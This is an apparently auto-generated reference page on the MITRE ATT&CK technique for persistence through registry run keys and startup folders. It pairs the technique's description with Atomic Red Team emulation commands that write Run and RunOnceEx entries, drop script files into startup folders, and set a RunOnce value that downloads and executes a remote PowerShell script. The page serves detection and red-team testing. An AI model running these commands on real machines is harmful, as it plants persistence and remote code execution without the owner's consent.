
# Registry Run Keys / Startup Folder

## Description

### MITRE Description

> Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.

Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>. The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>.

The following run keys are created by default on Windows systems:
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)

The following Registry keys can be used to set startup folder items for persistence:
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>

The following Registry keys can control automatic startup of services during boot:
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> and <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> subkeys can automatically launch programs.

Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run when any user logs on.

By default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.

Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['Administrator', 'User']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1547/001

## Potential Commands

```
$RunOnceKey = "#{reg_key_path}"
set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
Copy-Item $PathToAtomicsFolder\T1547.001\src\jsestartup.jse "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
Copy-Item $PathToAtomicsFolder\T1547.001\src\jsestartup.jse "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
cscript.exe /E:Jscript "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"
cscript.exe /E:Jscript "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"
Copy-Item $PathToAtomicsFolder\T1547.001\src\batstartup.bat "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
Copy-Item $PathToAtomicsFolder\T1547.001\src\batstartup.bat "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
Start-Process "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
Copy-Item $PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
Copy-Item $PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
cscript.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"
cscript.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "C:\Path\AtomicRedTeam.exe"
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll"
$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
```

## Commands Dataset

```
[{'command': 'REG ADD '
             '"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /V '
             '"Atomic Red Team" /t REG_SZ /F /D '
             '"C:\\Path\\AtomicRedTeam.exe"\n',
  'name': None,
  'source': 'atomics/T1547.001/T1547.001.yaml'},
 {'command': 'REG ADD '
             'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend '
             '/v 1 /d "C:\\Path\\AtomicRedTeam.dll"\n',
  'name': None,
  'source': 'atomics/T1547.001/T1547.001.yaml'},
 {'command': '$RunOnceKey = "#{reg_key_path}"\n'
             'set-itemproperty $RunOnceKey "NextRun" \'powershell.exe "IEX '
             '(New-Object '
             'Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"\'\n',
  'name': None,
  'source': 'atomics/T1547.001/T1547.001.yaml'},
 {'command': '$RunOnceKey = '
             '"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"\n'
             'set-itemproperty $RunOnceKey "NextRun" \'#{thing_to_execute} '
             '"IEX (New-Object '
             'Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"\'\n',
  'name': None,
  'source': 'atomics/T1547.001/T1547.001.yaml'},
 {'command': 'Copy-Item $PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs '
             '"$env:APPDATA\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\Startup\\vbsstartup.vbs"\n'
             'Copy-Item $PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs '
             '"C:\\ProgramData\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\StartUp\\vbsstartup.vbs"\n'
             'cscript.exe "$env:APPDATA\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\Startup\\vbsstartup.vbs"\n'
             'cscript.exe "C:\\ProgramData\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\StartUp\\vbsstartup.vbs"\n',
  'name': None,
  'source': 'atomics/T1547.001/T1547.001.yaml'},
 {'command': 'Copy-Item $PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse '
             '"$env:APPDATA\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\Startup\\jsestartup.jse"\n'
             'Copy-Item $PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse '
             '"C:\\ProgramData\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\StartUp\\jsestartup.jse"\n'
             'cscript.exe /E:Jscript "$env:APPDATA\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\Startup\\jsestartup.jse"\n'
             'cscript.exe /E:Jscript '
             '"C:\\ProgramData\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\StartUp\\jsestartup.jse"\n',
  'name': None,
  'source': 'atomics/T1547.001/T1547.001.yaml'},
 {'command': 'Copy-Item $PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat '
             '"$env:APPDATA\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\Startup\\batstartup.bat"\n'
             'Copy-Item $PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat '
             '"C:\\ProgramData\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\StartUp\\batstartup.bat"\n'
             'Start-Process "$env:APPDATA\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\Startup\\batstartup.bat"\n'
             'Start-Process "C:\\ProgramData\\Microsoft\\Windows\\Start '
             'Menu\\Programs\\StartUp\\batstartup.bat"\n',
  'name': None,
  'source': 'atomics/T1547.001/T1547.001.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder': {'atomic_tests': [{'auto_generated_guid': 'e55be3fd-3521-4610-9d1a-e210e42dcf05',
                                                                                                                     'description': 'Run '
                                                                                                                                    'Key '
                                                                                                                                    'Persistence\n'
                                                                                                                                    '\n'
                                                                                                                                    'Upon '
                                                                                                                                    'successful '
                                                                                                                                    'execution, '
                                                                                                                                    'cmd.exe '
                                                                                                                                    'will '
                                                                                                                                    'modify '
                                                                                                                                    'the '
                                                                                                                                    'registry '
                                                                                                                                    'by '
                                                                                                                                    'adding '
                                                                                                                                    '\\"Atomic '
                                                                                                                                    'Red '
                                                                                                                                    'Team\\" '
                                                                                                                                    'to '
                                                                                                                                    'the '
                                                                                                                                    'Run '
                                                                                                                                    'key. '
                                                                                                                                    'Output '
                                                                                                                                    'will '
                                                                                                                                    'be '
                                                                                                                                    'via '
                                                                                                                                    'stdout. \n',
                                                                                                                     'executor': {'cleanup_command': 'REG '
                                                                                                                                                     'DELETE '
                                                                                                                                                     '"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
                                                                                                                                                     '/V '
                                                                                                                                                     '"Atomic '
                                                                                                                                                     'Red '
                                                                                                                                                     'Team" '
                                                                                                                                                     '/f '
                                                                                                                                                     '>nul '
                                                                                                                                                     '2>&1\n',
                                                                                                                                  'command': 'REG '
                                                                                                                                             'ADD '
                                                                                                                                             '"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
                                                                                                                                             '/V '
                                                                                                                                             '"Atomic '
                                                                                                                                             'Red '
                                                                                                                                             'Team" '
                                                                                                                                             '/t '
                                                                                                                                             'REG_SZ '
                                                                                                                                             '/F '
                                                                                                                                             '/D '
                                                                                                                                             '"#{command_to_execute}"\n',
                                                                                                                                  'name': 'command_prompt'},
                                                                                                                     'input_arguments': {'command_to_execute': {'default': 'C:\\Path\\AtomicRedTeam.exe',
                                                                                                                                                                'description': 'Thing '
                                                                                                                                                                               'to '
                                                                                                                                                                               'Run',
                                                                                                                                                                'type': 'Path'}},
                                                                                                                     'name': 'Reg '
                                                                                                                             'Key '
                                                                                                                             'Run',
                                                                                                                     'supported_platforms': ['windows']},
                                                                                                                    {'auto_generated_guid': '554cbd88-cde1-4b56-8168-0be552eed9eb',
                                                                                                                     'description': 'RunOnce '
                                                                                                                                    'Key '
                                                                                                                                    'Persistence.\n'
                                                                                                                                    '\n'
                                                                                                                                    'Upon '
                                                                                                                                    'successful '
                                                                                                                                    'execution, '
                                                                                                                                    'cmd.exe '
                                                                                                                                    'will '
                                                                                                                                    'modify '
                                                                                                                                    'the '
                                                                                                                                    'registry '
                                                                                                                                    'to '
                                                                                                                                    'load '
                                                                                                                                    'AtomicRedTeam.dll '
                                                                                                                                    'to '
                                                                                                                                    'RunOnceEx. '
                                                                                                                                    'Output '
                                                                                                                                    'will '
                                                                                                                                    'be '
                                                                                                                                    'via '
                                                                                                                                    'stdout. \n',
                                                                                                                     'executor': {'cleanup_command': 'REG '
                                                                                                                                                     'DELETE '
                                                                                                                                                     'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend '
                                                                                                                                                     '/v '
                                                                                                                                                     '1 '
                                                                                                                                                     '/f '
                                                                                                                                                     '>nul '
                                                                                                                                                     '2>&1\n',
                                                                                                                                  'command': 'REG '
                                                                                                                                             'ADD '
                                                                                                                                             'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend '
                                                                                                                                             '/v '
                                                                                                                                             '1 '
                                                                                                                                             '/d '
                                                                                                                                             '"#{thing_to_execute}"\n',
                                                                                                                                  'name': 'command_prompt'},
                                                                                                                     'input_arguments': {'thing_to_execute': {'default': 'C:\\Path\\AtomicRedTeam.dll',
                                                                                                                                                              'description': 'Thing '
                                                                                                                                                                             'to '
                                                                                                                                                                             'Run',
                                                                                                                                                              'type': 'Path'}},
                                                                                                                     'name': 'Reg '
                                                                                                                             'Key '
                                                                                                                             'RunOnce',
                                                                                                                     'supported_platforms': ['windows']},
                                                                                                                    {'auto_generated_guid': 'eb44f842-0457-4ddc-9b92-c4caa144ac42',
                                                                                                                     'description': 'RunOnce '
                                                                                                                                    'Key '
                                                                                                                                    'Persistence '
                                                                                                                                    'via '
                                                                                                                                    'PowerShell\n'
                                                                                                                                    'Upon '
                                                                                                                                    'successful '
                                                                                                                                    'execution, '
                                                                                                                                    'a '
                                                                                                                                    'new '
                                                                                                                                    'entry '
                                                                                                                                    'will '
                                                                                                                                    'be '
                                                                                                                                    'added '
                                                                                                                                    'to '
                                                                                                                                    'the '
                                                                                                                                    'runonce '
                                                                                                                                    'item '
                                                                                                                                    'in '
                                                                                                                                    'the '
                                                                                                                                    'registry.\n',
                                                                                                                     'executor': {'cleanup_command': 'Remove-ItemProperty '
                                                                                                                                                     '-Path '
                                                                                                                                                     '#{reg_key_path} '
                                                                                                                                                     '-Name '
                                                                                                                                                     '"NextRun" '
                                                                                                                                                     '-Force '
                                                                                                                                                     '-ErrorAction '
                                                                                                                                                     'Ignore\n',
                                                                                                                                  'command': '$RunOnceKey '
                                                                                                                                             '= '
                                                                                                                                             '"#{reg_key_path}"\n'
                                                                                                                                             'set-itemproperty '
                                                                                                                                             '$RunOnceKey '
                                                                                                                                             '"NextRun" '
                                                                                                                                             "'#{thing_to_execute} "
                                                                                                                                             '"IEX '
                                                                                                                                             '(New-Object '
                                                                                                                                             'Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"\'\n',
                                                                                                                                  'elevation_required': True,
                                                                                                                                  'name': 'powershell'},
                                                                                                                     'input_arguments': {'reg_key_path': {'default': 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
                                                                                                                                                          'description': 'Path '
                                                                                                                                                                         'to '
                                                                                                                                                                         'registry '
                                                                                                                                                                         'key '
                                                                                                                                                                         'to '
                                                                                                                                                                         'update',
                                                                                                                                                          'type': 'Path'},
                                                                                                                                         'thing_to_execute': {'default': 'powershell.exe',
                                                                                                                                                              'description': 'Thing '
                                                                                                                                                                             'to '
                                                                                                                                                                             'Run',
                                                                                                                                                              'type': 'Path'}},
                                                                                                                     'name': 'PowerShell '
                                                                                                                             'Registry '
                                                                                                                             'RunOnce',
                                                                                                                     'supported_platforms': ['windows']},
                                                                                                                    {'auto_generated_guid': '2cb98256-625e-4da9-9d44-f2e5f90b8bd5',
                                                                                                                     'description': 'vbs '
                                                                                                                                    'files '
                                                                                                                                    'can '
                                                                                                                                    'be '
                                                                                                                                    'placed '
                                                                                                                                    'in '
                                                                                                                                    'and '
                                                                                                                                    'ran '
                                                                                                                                    'from '
                                                                                                                                    'the '
                                                                                                                                    'startup '
                                                                                                                                    'folder '
                                                                                                                                    'to '
                                                                                                                                    'maintain '
                                                                                                                                    'persistance. '
                                                                                                                                    'Upon '
                                                                                                                                    'execution, '
                                                                                                                                    '"T1547.001 '
                                                                                                                                    'Hello, '
                                                                                                                                    'World '
                                                                                                                                    'VBS!" '
                                                                                                                                    'will '
                                                                                                                                    'be '
                                                                                                                                    'displayed '
                                                                                                                                    'twice. \n'
                                                                                                                                    'Additionally, '
                                                                                                                                    'the '
                                                                                                                                    'new '
                                                                                                                                    'files '
                                                                                                                                    'can '
                                                                                                                                    'be '
                                                                                                                                    'viewed '
                                                                                                                                    'in '
                                                                                                                                    'the '
                                                                                                                                    '"$env:APPDATA\\Microsoft\\Windows\\Start '
                                                                                                                                    'Menu\\Programs\\Startup"\n'
                                                                                                                                    'folder '
                                                                                                                                    'and '
                                                                                                                                    'will '
                                                                                                                                    'also '
                                                                                                                                    'run '
                                                                                                                                    'when '
                                                                                                                                    'the '
                                                                                                                                    'computer '
                                                                                                                                    'is '
                                                                                                                                    'restarted '
                                                                                                                                    'and '
                                                                                                                                    'the '
                                                                                                                                    'user '
                                                                                                                                    'logs '
                                                                                                                                    'in.\n',
                                                                                                                     'executor': {'cleanup_command': 'Remove-Item '
                                                                                                                                                     '"$env:APPDATA\\Microsoft\\Windows\\Start '
                                                                                                                                                     'Menu\\Programs\\Startup\\vbsstartup.vbs" '
                                                                                                                                                     '-ErrorAction '
                                                                                                                                                     'Ignore\n'
                                                                                                                                                     'Remove-Item '
                                                                                                                                                     '"C:\\ProgramData\\Microsoft\\Windows\\Start '
                                                                                                                                                     'Menu\\Programs\\StartUp\\vbsstartup.vbs" '
                                                                                                                                                     '-ErrorAction '
                                                                                                                                                     'Ignore\n',
                                                                                                                                  'command': 'Copy-Item '
                                                                                                                                             '$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs '
                                                                                                                                             '"$env:APPDATA\\Microsoft\\Windows\\Start '
                                                                                                                                             'Menu\\Programs\\Startup\\vbsstartup.vbs"\n'
                                                                                                                                             'Copy-Item '
                                                                                                                                             '$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs '
                                                                                                                                             '"C:\\ProgramData\\Microsoft\\Windows\\Start '
                                                                                                                                             'Menu\\Programs\\StartUp\\vbsstartup.vbs"\n'
                                                                                                                                             'cscript.exe '
                                                                                                                                             '"$env:APPDATA\\Microsoft\\Windows\\Start '
                                                                                                                                             'Menu\\Programs\\Startup\\vbsstartup.vbs"\n'
                                                                                                                                             'cscript.exe '
                                                                                                                                             '"C:\\ProgramData\\Microsoft\\Windows\\Start '
                                                                                                                                             'Menu\\Programs\\StartUp\\vbsstartup.vbs"\n',
                                                                                                                                  'elevation_required': True,
                                                                                                                                  'name': 'powershell'},
                                                                                                                     'name': 'Suspicious '
                                                                                                                             'vbs '
                                                                                                                             'file '
                                                                                                                             'run '
                                                                                                                             'from '
                                                                                                                             'startup '
                                                                                                                             'Folder',
                                                                                                                     'supported_platforms': ['windows']},
                                                                                                                    {'auto_generated_guid': 'dade9447-791e-4c8f-b04b-3a35855dfa06',
                                                                                                                     'description': 'jse '
                                                                                                                                    'files '
                                                                                                                                    'can '
                                                                                                                                    'be '
                                                                                                                                    'placed '
                                                                                                                                    'in '
                                                                                                                                    'and '
                                                                                                                                    'ran '
                                                                                                                                    'from '
                                                                                                                                    'the '
                                                                                                                                    'startup '
                                                                                                                                    'folder '
                                                                                                                                    'to '
                                                                                                                                    'maintain '
                                                                                                                                    'persistance.\n'
                                                                                                                                    'Upon '
                                                                                                                                    'execution, '
                                                                                                                                    '"T1547.001 '
                                                                                                                                    'Hello, '
                                                                                                                                    'World '
                                                                                                                                    'JSE!" '
                                                                                                                                    'will '
                                                                                                                                    'be '
                                                                                                                                    'displayed '
                                                                                                                                    'twice. \n'
                                                                                                                                    'Additionally, '
                                                                                                                                    'the '
                                                                                                                                    'new '
                                                                                                                                    'files '
                                                                                                                                    'can '
                                                                                                                                    'be '
                                                                                                                                    'viewed '
                                                                                                                                    'in '
                                                                                                                                    'the '
                                                                                                                                    '"$env:APPDATA\\Microsoft\\Windows\\Start '
                                                                                                                                    'Menu\\Programs\\Startup"\n'
                                                                                                                                    'folder '
                                                                                                                                    'and '
                                                                                                                                    'will '
                                                                                                                                    'also '
                                                                                                                                    'run '
                                                                                                                                    'when '
                                                                                                                                    'the '
                                                                                                                                    'computer '
                                                                                                                                    'is '
                                                                                                                                    'restarted '
                                                                                                                                    'and '
                                                                                                                                    'the '
                                                                                                                                    'user '
                                                                                                                                    'logs '
                                                                                                                                    'in.\n',
                                                                                                                     'executor': {'cleanup_command': 'Remove-Item '
                                                                                                                                                     '"$env:APPDATA\\Microsoft\\Windows\\Start '
                                                                                                                                                     'Menu\\Programs\\Startup\\jsestartup.jse" '
                                                                                                                                                     '-ErrorAction '
                                                                                                                                                     'Ignore\n'
                                                                                                                                                     'Remove-Item '
                                                                                                                                                     '"C:\\ProgramData\\Microsoft\\Windows\\Start '
                                                                                                                                                     'Menu\\Programs\\StartUp\\jsestartup.jse" '
                                                                                                                                                     '-ErrorAction '
                                                                                                                                                     'Ignore\n',
                                                                                                                                  'command': 'Copy-Item '
                                                                                                                                             '$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse '
                                                                                                                                             '"$env:APPDATA\\Microsoft\\Windows\\Start '
                                                                                                                                             'Menu\\Programs\\Startup\\jsestartup.jse"\n'
                                                                                                                                             'Copy-Item '
                                                                                                                                             '$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse '
                                                                                                                                             '"C:\\ProgramData\\Microsoft\\Windows\\Start '
                                                                                                                                             'Menu\\Programs\\StartUp\\jsestartup.jse"\n'
                                                                                                                                             'cscript.exe '
                                                                                                                                             '/E:Jscript '
                                                                                                                                             '"$env:APPDATA\\Microsoft\\Windows\\Start '
                                                                                                                                             'Menu\\Programs\\Startup\\jsestartup.jse"\n'
                                                                                                                                             'cscript.exe '
                                                                                                                                             '/E:Jscript '
                                                                                                                                             '"C:\\ProgramData\\Microsoft\\Windows\\Start '
                                                                                                                                             'Menu\\Programs\\StartUp\\jsestartup.jse"\n',
                                                                                                                                  'elevation_required': True,
                                                                                                                                  'name': 'powershell'},
                                                                                                                     'name': 'Suspicious '
                                                                                                                             'jse '
                                                                                                                             'file '
                                                                                                                             'run '
                                                                                                                             'from '
                                                                                                                             'startup '
                                                                                                                             'Folder',
                                                                                                                     'supported_platforms': ['windows']},
                                                                                                                    {'auto_generated_guid': '5b6768e4-44d2-44f0-89da-a01d1430fd5e',
                                                                                                                     'description': 'bat '
                                                                                                                                    'files '
                                                                                                                                    'can '
                                                                                                                                    'be '
                                                                                                                                    'placed '
                                                                                                                                    'in '
                                                                                                                                    'and '
                                                                                                                                    'executed '
                                                                                                                                    'from '
                                                                                                                                    'the '
                                                                                                                                    'startup '
                                                                                                                                    'folder '
                                                                                                                                    'to '
                                                                                                                                    'maintain '
                                                                                                                                    'persistance.\n'
                                                                                                                                    'Upon '
                                                                                                                                    'execution, '
                                                                                                                                    'cmd '
                                                                                                                                    'will '
                                                                                                                                    'be '
                                                                                                                                    'run '
                                                                                                                                    'and '
                                                                                                                                    'immediately '
                                                                                                                                    'closed. '
                                                                                                                                    'Additionally, '
                                                                                                                                    'the '
                                                                                                                                    'new '
                                                                                                                                    'files '
                                                                                                                                    'can '
                                                                                                                                    'be '
                                                                                                                                    'viewed '
                                                                                                                                    'in '
                                                                                                                                    'the '
                                                                                                                                    '"$env:APPDATA\\Microsoft\\Windows\\Start '
                                                                                                                                    'Menu\\Programs\\Startup"\n'
                                                                                                                                    'folder '
                                                                                                                                    'and '
                                                                                                                                    'will '
                                                                                                                                    'also '
                                                                                                                                    'run '
                                                                                                                                    'when '
                                                                                                                                    'the '
                                                                                                                                    'computer '
                                                                                                                                    'is '
                                                                                                                                    'restarted '
                                                                                                                                    'and '
                                                                                                                                    'the '
                                                                                                                                    'user '
                                                                                                                                    'logs '
                                                                                                                                    'in.\n',
                                                                                                                     'executor': {'cleanup_command': 'Remove-Item '
                                                                                                                                                     '"$env:APPDATA\\Microsoft\\Windows\\Start '
                                                                                                                                                     'Menu\\Programs\\Startup\\batstartup.bat" '
                                                                                                                                                     '-ErrorAction '
                                                                                                                                                     'Ignore\n'
                                                                                                                                                     'Remove-Item '
                                                                                                                                                     '"C:\\ProgramData\\Microsoft\\Windows\\Start '
                                                                                                                                                     'Menu\\Programs\\StartUp\\batstartup.bat" '
                                                                                                                                                     '-ErrorAction '
                                                                                                                                                     'Ignore\n',
                                                                                                                                  'command': 'Copy-Item '
                                                                                                                                             '$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat '
                                                                                                                                             '"$env:APPDATA\\Microsoft\\Windows\\Start '
                                                                                                                                             'Menu\\Programs\\Startup\\batstartup.bat"\n'
                                                                                                                                             'Copy-Item '
                                                                                                                                             '$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat '
                                                                                                                                             '"C:\\ProgramData\\Microsoft\\Windows\\Start '
                                                                                                                                             'Menu\\Programs\\StartUp\\batstartup.bat"\n'
                                                                                                                                             'Start-Process '
                                                                                                                                             '"$env:APPDATA\\Microsoft\\Windows\\Start '
                                                                                                                                             'Menu\\Programs\\Startup\\batstartup.bat"\n'
                                                                                                                                             'Start-Process '
                                                                                                                                             '"C:\\ProgramData\\Microsoft\\Windows\\Start '
                                                                                                                                             'Menu\\Programs\\StartUp\\batstartup.bat"\n',
                                                                                                                                  'elevation_required': True,
                                                                                                                                  'name': 'powershell'},
                                                                                                                     'name': 'Suspicious '
                                                                                                                             'bat '
                                                                                                                             'file '
                                                                                                                             'run '
                                                                                                                             'from '
                                                                                                                             'startup '
                                                                                                                             'Folder',
                                                                                                                     'supported_platforms': ['windows']}],
                                                                                                   'attack_technique': 'T1547.001',
                                                                                                   'display_name': 'Boot '
                                                                                                                   'or '
                                                                                                                   'Logon '
                                                                                                                   'Autostart '
                                                                                                                   'Execution: '
                                                                                                                   'Registry '
                                                                                                                   'Run '
                                                                                                                   'Keys '
                                                                                                                   '/ '
                                                                                                                   'Startup '
                                                                                                                   'Folder'}}]
```

# Tactics


* [Persistence](../tactics/Persistence.md)

* [Privilege Escalation](../tactics/Privilege-Escalation.md)
    

# Mitigations

None

# Actors


* [APT29](../actors/APT29.md)

* [MuddyWater](../actors/MuddyWater.md)
    
* [APT37](../actors/APT37.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [Turla](../actors/Turla.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [APT19](../actors/APT19.md)
    
* [Patchwork](../actors/Patchwork.md)
    
* [FIN10](../actors/FIN10.md)
    
* [FIN6](../actors/FIN6.md)
    
* [Dark Caracal](../actors/Dark-Caracal.md)
    
* [BRONZE BUTLER](../actors/BRONZE-BUTLER.md)
    
* [Cobalt Group](../actors/Cobalt-Group.md)
    
* [Ke3chang](../actors/Ke3chang.md)
    
* [Honeybee](../actors/Honeybee.md)
    
* [Magic Hound](../actors/Magic-Hound.md)
    
* [Putter Panda](../actors/Putter-Panda.md)
    
* [APT18](../actors/APT18.md)
    
* [Threat Group-3390](../actors/Threat-Group-3390.md)
    
* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)
    
* [APT32](../actors/APT32.md)
    
* [APT3](../actors/APT3.md)
    
* [Gorgon Group](../actors/Gorgon-Group.md)
    
* [Darkhotel](../actors/Darkhotel.md)
    
* [FIN7](../actors/FIN7.md)
    
* [APT39](../actors/APT39.md)
    
* [APT33](../actors/APT33.md)
    
* [Kimsuky](../actors/Kimsuky.md)
    
* [Machete](../actors/Machete.md)
    
* [APT41](../actors/APT41.md)
    
* [Inception](../actors/Inception.md)
    
* [RTM](../actors/RTM.md)
    
* [Silence](../actors/Silence.md)
    
* [Molerats](../actors/Molerats.md)
    
* [Sharpshooter](../actors/Sharpshooter.md)
    
* [Gamaredon Group](../actors/Gamaredon-Group.md)
    
* [Tropic Trooper](../actors/Tropic-Trooper.md)
    
* [Rocke](../actors/Rocke.md)
    
